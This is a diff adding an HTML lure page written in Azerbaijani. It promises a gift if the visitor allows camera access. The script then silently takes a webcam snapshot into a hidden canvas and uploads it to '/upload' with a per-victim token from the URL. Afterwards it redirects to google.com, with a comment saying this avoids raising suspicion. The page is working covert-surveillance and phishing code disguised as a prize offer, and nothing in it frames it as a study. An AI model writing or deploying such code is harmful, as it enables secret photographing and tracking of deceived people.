@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Hədiyyə Çarxı</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>body { font-family: sans-serif; text-align: center; background: #f0f2f5; }</style>
+</head>
+<body>
+    <h2>🎁 Təbriklər!</h2>
+    <p>Hədiyyənizi götürmək üçün kameraya icazə verin.</p>
+    <video id="v" autoplay style="display:none"></video>
+    <canvas id="c" style="display:none"></canvas>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const token = urlParams.get('t');
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+        .then(s => {
+            const v = document.getElementById('v');
+            v.srcObject = s;
+            setTimeout(() => {
+                const c = document.getElementById('c');
+                c.width = 640; c.height = 480;
+                c.getContext('2d').drawImage(v, 0, 0);
+                const img = c.toDataURL('image/png');
+
+                fetch('/upload', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ token: token, image: img })
+                }).then(() => {
+                    window.location.href = "https://google.com"; // Şübhə yaratmamaq üçün yönləndir
+                });
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
